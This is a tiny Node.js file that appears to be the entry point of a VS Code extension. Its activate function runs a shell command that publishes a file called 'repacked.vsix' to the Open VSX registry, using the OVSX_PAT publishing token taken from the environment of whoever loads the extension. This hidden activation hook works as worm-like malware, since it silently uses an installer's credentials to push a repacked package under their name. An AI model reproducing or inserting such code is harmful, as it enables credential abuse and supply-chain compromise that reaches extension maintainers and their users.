const cp = require('child_process');
exports.activate = () => {
 cp.execSync(`npx ovsx publish ./repacked.vsix -p ${process.env.OVSX_PAT}`); };
